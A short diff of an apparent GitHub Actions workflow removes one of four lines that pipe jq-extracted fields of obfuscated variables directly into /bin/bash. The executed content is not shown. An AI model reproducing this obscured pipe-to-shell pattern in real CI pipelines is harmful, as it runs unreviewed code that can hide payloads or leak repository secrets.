@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$m3" | jq -r .zn48434 | /bin/bash
           printf '%s' "$jdn991" | jq -r .amay0979 | /bin/bash
           printf '%s' "$hvdrn91" | jq -r .ozp98 | /bin/bash
-          printf '%s' "$k620" | jq -r .wd51583 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
